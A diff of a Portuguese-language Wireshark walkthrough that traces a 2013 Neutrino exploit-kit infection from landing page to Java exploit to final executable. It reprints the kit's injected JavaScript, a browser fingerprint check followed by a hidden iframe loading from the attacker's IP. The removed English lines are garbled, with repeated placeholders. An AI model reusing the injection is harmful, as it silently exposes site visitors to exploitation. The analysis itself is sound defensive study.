@@ -76,147 +76,130 @@ Firewall ACL Rules: Wireshark can generate ready-made firewall rules (iptables, 
 
 WALKTHROUGH: MALWAREANALYSIS.NET
 
-01 - NEUTRIN (2013-06-18)
-After conducting some research, it's possible to understand that this was a very famous attack between 2013 and 2017, so several patterns have already been identified!
+01 - NEUTRIN(2013-06-18)
+Após realizar algumas pesquisas é possível entender que foi um ataque muito famoso entre 2013 e 2017, então já existem vários padrões identificados!
 
-The first one is the URL pattern: [domain]/[random-word].php?seed=[characters] (They usually look like this). Below, using the http.request filter, we can observe the same pattern:
+O primeiro deles é o padrão de URL: [domínio]/[palavra-aleatória].php?seed=[caracteres] (Costumam ser assim) abaixo, usando o filtro http.request, Podemos observar o mesmo padrão:
 
-It's interesting to note that I also used a new filter (Host) within the hypertext transfer protocol:
+É interessante notar que também peguei um filtro novo (Host) dentro de hypertext transfer protocol
 
 <img width="1755" height="462" alt="image" src="https://github.com/user-attachments/assets/350b3935-7f85-4094-97cb-2379d7315dcb" />
 
-I also used the Content-type filter (within HTTP and dragged it to the columns!)
+, Usei também o filtro Conent-type(dentro do  HTTP e arrastei pras colunas!) 
 
 HTTP.content_type contains "application":
 
-<img width="1836" height="797" alt="image" Using `tcp.stream eq 0`:
+<img width="1836" height="797" alt="image" src="https://github.com/user-attachments/assets/afae6c9f-eb8f-4e93-a75c-6e4ab387ba73" />
 
-[Image of a tcp stream with a width of 1884 and a height of 807]
+Usando o tcp.stream eq 0:
 
-Looking more closely, you can find this!
+<img width="1884" height="807" alt="image" src="https://github.com/user-attachments/assets/f2f9cfd7-60d0-4c66-89a8-b2882ee8ef48" />
 
-[Image of a tcp stream with a width of 1884 and a height of 807]
+Olhando com mais detalhes é possível encontrar isto!
 
-[Image of a tcp stream with a width of 1884 and a height of 807]
+<img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/8ad779ef-224f-4538-a19e-bc17aa5b4b99" />
 
-[Image of a tcp stream with a width of 1884 and a height of 807]
-
-[Image of a tcp stream with a width of 1884 and a height of 807]
-
-[Image of a tcp stream with a width of 1884 and a height of 807]
-
-[Image of a tcp stream with a width of 1884 and a height of 807]
-
-[Image of a tcp stream with a width of 1884 and a height of 807] <img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/8ad779ef-224f-4538-a19e-bc17aa5b4b99" />
-
-Which is nothing more and nothing less than malicious injection; researching further reveals what it does:
+Que é nada mais nada menos que a injeção maliciosa, pesquisando mais sobre é possível identificar o que ela faz:
 
 <img width="1835" height="848" alt="image" src="https://github.com/user-attachments/assets/6d235fdd-0d7e-4e33-bf48-3785d2b73960" />
 
-"Code Analysis":
-The Fingerprinting Mechanism
-The browserDetectNav and showBrowVer functions serve to identify if the victim is an "interesting" target. The code checks:
+"Analise do código":
+O Mecanismo de Fingerprinting
+As funções browserDetectNav e showBrowVer servem para identificar se a vítima é um alvo "interessante". O código verifica:
 
-Operating System: It searches for Windows, Linux, Mac, etc.
+Sistema Operacional: Ele busca por Windows, Linux, Mac, etc.
 
-Browser and Version: It specifically tests if the user is using Internet Explorer (MSIE) version 8 or higher, Firefox, or Opera.
+Navegador e Versão: Ele testa especificamente se o usuário está usando Internet Explorer (MSIE) versão 8 ou superior, Firefox ou Opera.
 
-2. The Attack Condition (The "Filter")
-
-The most critical part is here:
+2. A Condição de Ataque (O "Filtro")
+A parte mais crítica está aqui:
 
 JavaScript
 
 if ((data[0] == 'Opera' || (data[0] == 'MSIE' & data[1] >= 8) || data[0] == 'Firefox') & data[3] == 'Windows')
+O Exploit Kit só vai agir se você estiver no Windows e usando um desses navegadores. Se você estiver no Linux ou Mac, o código não faz nada. Isso serve para não "desperdiçar" o exploit em sistemas que ele não consegue infectar e para evitar detecção por pesquisadores de segurança.
 
-The Exploit Kit will only act if you are on Windows and using one of these browsers. If you are on Linux or Mac, the code does nothing. This is to avoid "wasting" the exploit on systems it cannot infect and to prevent detection by security researchers.
-
-3. The Redirect (The Malicious Iframe)
-
-If the victim passes the test above, the code executes the silent redirect:
+3. O Redirecionamento (O Iframe Malicioso)
+Se a vítima passar no teste acima, o código executa o redirecionamento silencioso:
 
 JavaScript
 
 var js_kod2 = document.createElement('iframe');
-
 js_kod2.src = 'http://93.171.172.220/?1';
-
 js_kod2.width = '5px';
-
 js_kod2.height = '6px';
-
 js_kod2.setAttribute('style','visibility:hidden');
+Ele cria um iframe invisível (escondido e com tamanho minúsculo).
 
-It creates an invisible iframe (hidden and with a tiny size).
+O src aponta para o IP 93.171.172.220/?1. Este é o servidor do Neutrino EK.
 
-The src points to the IP 93.171.172.220/?1. This is the Neutrino EK server.
-
-With this search information, we can filter by ip.addr == 93.171.172.220, since we now understand that this is the Neutrino server!
+Com estas informações de pesquisa podemos filtrar por ip.addr == 93.171.172.220, já que agora entendemos se tratar do servidor do Neutrino!
 
 <img width="1856" height="826" alt="image" src="https://github.com/user-attachments/assets/c36f9318-f91d-4e85-acbc-549134f77a7d" />
 
-In this list, we look for the first HTTP GET packet made to this IP. Generally, the URL will be something short like /?1. This is your Landing Page.
+Nessa lista, procuramos pelo primeiro pacote HTTP GET feito para esse IP. Geralmente, a URL será algo curto como /?1. Essa é a sua Landing Page.
 
-Using the TCP stream again, but this time on the first GET request to the address in question:
+Usando o tcp stream novamente mas dessa vez no primeiro get do endereço em questão :
 <img width="1682" height="894" alt="image" src="https://github.com/user-attachments/assets/86cd9375-d2a4-4f2d-a7a2-f7db90f6cbb6" />
 
-Identification of the Java Exploit
-Request (Red): The GET request has a random filename (/cbsthcfq?...), which is typical of exploit kits to avoid static signatures.
+Identificação do Exploit Java
+Request (Vermelho): O GET possui um nome de arquivo aleatório (/cbsthcfq?...), o que é típico de kits de exploração para evitar assinaturas estáticas.
 
-User-Agent: Note that the file request is no longer being made by the pure IE8 browser, but by Java/1.6.0_25. This indicates that the Landing Page code managed to activate the Java plugin on the victim's computer to download the exploit.
+User-Agent: Note que quem está pedindo o arquivo não é mais o navegador IE8 puro, mas sim o Java/1.6.0_25. Isso indica que o código da Landing Page conseguiu ativar o plugin do Java no computador da vítima para baixar o exploit.
 
-Content-Type: The server responds with application/java-archive, confirming that the file is a .jar. 2. Anatomy of the Malicious File (The Stream Body)
+Content-Type: O servidor responde com application/java-archive, confirmando que o arquivo é um .jar.
 
-Looking at the blue text (ASCII), we can see the internal structure of the Java file:
+2. Anatomia do Arquivo Malicioso (O corpo do Stream)
+Olhando para o texto azul (ASCII), podemos ver a estrutura interna do arquivo Java:
 
-PK Signature: The first PK characters indicate that this is a compressed file (ZIP/JAR).
+Assinatura PK: Os primeiros caracteres PK indicam que este é um arquivo comprimido (ZIP/JAR).
 
-META-INF/MANIFEST.MF: This is the default Java configuration file.
+META-INF/MANIFEST.MF: Este é o arquivo de configuração padrão do Java.
 
-Class Names: You may see strings like Art.class. In a real Neutrino exploit, these classes are often obfuscated to hide code that exploits vulnerabilities such as CVE-2013-2465 or similar vulnerabilities from that era.
+Nomes de Classes: Você pode ver strings como Art.class. Em um exploit real do Neutrino, essas classes costumam estar ofuscadas para esconder o código que explora vulnerabilidades como a CVE-2013-2465 ou similares daquela época.
 
-To find the final malware now, use this filter in Wireshark:
+Para encontrar o malware final agora, use este filtro no Wireshark:
 http.request.method == "GET" && ip.src == 192.168.122.178
-The final malware will be the next get packet after the java packet:
+O malware final vai ser o próximo pacote get depois do pacote java:
 <img width="1644" height="342" alt="image" src="https://github.com/user-attachments/assets/4e1a3370-8a28-4041-bf69-85e6127184f6" />
 
-We found the exploit! Just do an HTTP stream and after searching I find this analysis:
+Achamos o exploit! É só dar um HTTP stream e após pesquisa encontro esta analise:
 
-1. Binary Identification (MZ Signature)
-At the end of the data block you sent, it is possible to clearly seeHere's the signature:
+1. Identificação do Binário (Assinatura MZ)
+No final do bloco de dados que você enviou, é possível ver claramente a assinatura:
 
 ...ylhMzfY-h.u...
 
-The MZ character (which appears as Mz in your stream) are the first two bytes of any Windows executable file (Portable Executable - PE). This confirms that the Neutrino Exploit Kit has successfully exploited the Java vulnerability and is now sending the malicious ".exe" file for execution.
+O caractere MZ (que aparece como Mz no seu stream) são os dois primeiros bytes de qualquer arquivo executável do Windows (Portable Executable - PE). Isso confirma que o Exploit Kit Neutrino teve sucesso em explorar a vulnerabilidade Java e agora está enviando o arquivo ".exe" malicioso para execução.
 
-2. Traffic Obfuscation
-Note that the file content appears as "garbage" or repetitive text (such as the strings ylh, vwn, wny that are repeated exhaustively).
+2. Ofuscação do Tráfego
+Note que o conteúdo do arquivo parece "lixo" ou texto repetitivo (como as strings ylh, vwn, wny que se repetem exaustivamente).
 
-XOR or Substitution: Neutrino often uses a simple cipher (such as XOR) to "mask" the executable during transmission over the network.
+XOR ou Substituição: O Neutrino frequentemente utiliza uma cifra simples (como XOR) para "mascarar" o executável durante a transmissão pela rede.
 
-Evasion: This is done so that firewalls and network antivirus (IPS/IDS) do not recognize the file as a malicious executable while it travels over the cable. The malware "unpacks" or "decrypts" this binary in memory as soon as the download finishes. 3. HTTP Header Analysis
-Content-Length: 93696: The malware is approximately 91 KB.
+Evasão: Isso é feito para que firewalls e antivírus de rede (IPS/IDS) não reconheçam o arquivo como um executável malicioso enquanto ele passa pelo cabo. O malware "descompacta" ou "descriptografa" esse binário na memória assim que o download termina.
 
-Server: nginx/1.4.1: The attacker is using an Nginx server, very common in Exploit Kit infrastructures due to its performance.
+3. Análise dos Cabeçalhos HTTP
+Content-Length: 93696: O malware possui aproximadamente 91 KB.
 
-User-Agent: Note that the User-Agent remains Java (Java/1.6.0_25), proving that the Java process you identified earlier is the one "pulling" the final file to disk.
+Server: nginx/1.4.1: O atacante está utilizando um servidor Nginx, muito comum em infraestruturas de Exploit Kits por sua performance.
 
-Suggested Next Step
-To confirm what this malware does, you can try extracting this object from Wireshark:
+User-Agent: Observe que o User-Agent continua sendo o do Java (Java/1.6.0_25), provando que o processo Java que você identificou anteriormente é quem está "puxando" o arquivo final para o disco.
 
-Go to File > Export Objects > HTTP.
+Próximo Passo Sugerido
+Para confirmar o que esse malware faz, você pode tentar extrair esse objeto do Wireshark:
 
-Select the file associated with the URL /drddbg?mebhqtwycgg=nshbdaiqnay.
+Vá em File > Export Objects > HTTP.
 
-Save the file and check its hash on sites like VirusTotal to identify the malware family (at that time, Neutrino used to distribute Ransomware or Banking Trojans like Zeus/Zbot).
+Selecione o arquivo associado à URL /drddbg?mebhqtwycgg=nshbdaiqnay.
 
-After running it on VirusTotal:
+Salve o arquivo e verifique o hash dele em sites como o VirusTotal para identificar a família do malware (nesta época, o Neutrino costumava distribuir Ransomwares ou Banking Trojans como o Zeus/Zbot).
+
+Após jogar no Virustotal:
 <img width="1701" height="648" alt="image" src="https://github.com/user-attachments/assets/0062578c-52f0-4a39-ac46-a637eedd4c01" />
-Running another friend of his!
-
+Jogando um outro amigo dele!
 <img width="1629" height="764" alt="image" src="https://github.com/user-attachments/assets/9ccec9f8-1821-4547-9d46-a5bcd9734d67" />
 
-That's all for now! Until the next analysis!
-
+Encerramos por aqui! Até a próxima analise!
 
 
